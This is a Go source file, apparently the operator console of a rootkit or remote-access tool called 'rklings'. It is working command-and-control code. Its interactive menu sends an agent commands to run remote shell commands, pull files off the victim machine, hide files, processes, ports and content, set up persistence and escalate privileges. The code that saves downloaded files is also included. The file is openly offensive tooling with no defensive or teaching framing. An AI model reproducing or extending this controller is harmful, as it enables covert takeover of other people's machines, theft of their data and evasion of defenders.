package main

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func startTUI() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("[*] Operator console ready. Type 'help' for commands.")

	for {
		fmt.Print("rklings> ")
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToLower(parts[0])
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "help":
			fmt.Println("  ping                  Send PING to agent")
			fmt.Println("  status                Show agent status")
			fmt.Println("  shell <command>       Execute a shell command")
			fmt.Println("  download <path>       Save a remote file locally")
			fmt.Println("  hide <type> <value>   Hide file/pid/port/content")
			fmt.Println("  unhide <type> <value> Restore the same target")
			fmt.Println("  persist               Enable persistence")
			fmt.Println("  escalate [pid]        Escalate privileges")
			fmt.Println("  exit                  Quit")
		case "ping":
			start := time.Now()
			resp, err := sendToAgent("PING")
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s (%dms)\n", resp, time.Since(start).Milliseconds())
		case "status":
			resp, err := sendToAgent("STATUS")
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", resp)
		case "shell":
			if arg == "" {
				fmt.Println("[-] usage: shell <command>")
				continue
			}
			resp, err := sendToAgent("SHELL " + arg)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Print(resp)
		case "download":
			if arg == "" {
				fmt.Println("[-] usage: download <path>")
				continue
			}
			resp, err := sendToAgent("DOWNLOAD " + arg)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			path, err := saveDownload(arg, []byte(resp))
			if err != nil {
				fmt.Printf("[-] save download: %v\n", err)
				continue
			}
			fmt.Printf("[+] saved %d bytes -> %s\n", len(resp), path)
		case "hide":
			hideParts := strings.SplitN(arg, " ", 2)
			if len(hideParts) < 2 {
				fmt.Println("[-] usage: hide <file|pid|port|content> <value>")
				continue
			}
			resp, err := sendToAgent(fmt.Sprintf("HIDE %s %s", strings.ToUpper(hideParts[0]), hideParts[1]))
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", resp)
		case "unhide":
			hideParts := strings.SplitN(arg, " ", 2)
			if len(hideParts) < 2 {
				fmt.Println("[-] usage: unhide <file|pid|port|content> <value>")
				continue
			}
			resp, err := sendToAgent(fmt.Sprintf("UNHIDE %s %s", strings.ToUpper(hideParts[0]), hideParts[1]))
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", resp)
		case "persist":
			resp, err := sendToAgent("PERSIST")
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", resp)
		case "escalate":
			cmd := "ESCALATE"
			if arg != "" {
				cmd += " " + arg
			}
			resp, err := sendToAgent(cmd)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", resp)
		case "exit", "quit":
			return
		default:
			fmt.Printf("[-] unknown command: %s\n", cmd)
		}
	}
}

func saveDownload(remotePath string, payload []byte) (string, error) {
	relative := strings.TrimPrefix(filepath.Clean("/"+remotePath), string(filepath.Separator))
	if relative == "" || relative == "." {
		return "", fmt.Errorf("invalid remote path")
	}
	path := filepath.Join(".rklings", "downloads", relative)
	directory := filepath.Dir(path)
	if err := os.MkdirAll(directory, 0o700); err != nil {
		return "", err
	}
	temporary, err := os.CreateTemp(directory, ".download-*")
	if err != nil {
		return "", err
	}
	temporaryPath := temporary.Name()
	defer os.Remove(temporaryPath)
	if err := temporary.Chmod(0o600); err != nil {
		temporary.Close()
		return "", err
	}
	if _, err := temporary.Write(payload); err != nil {
		temporary.Close()
		return "", err
	}
	if err := temporary.Sync(); err != nil {
		temporary.Close()
		return "", err
	}
	if err := temporary.Close(); err != nil {
		return "", err
	}
	if err := os.Rename(temporaryPath, path); err != nil {
		return "", err
	}
	return path, nil
}
